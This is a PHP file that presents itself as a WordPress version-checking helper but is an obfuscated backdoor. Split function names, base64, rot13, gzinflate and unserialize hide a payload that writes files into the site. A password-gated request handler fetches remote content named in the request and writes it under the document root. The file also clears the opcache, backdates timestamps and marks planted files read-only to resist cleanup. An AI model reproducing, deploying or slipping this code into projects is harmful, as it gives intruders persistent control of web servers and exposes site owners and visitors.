<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("nhrof{$check}w", '971768c9db7e985fdcb3281d20748082')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}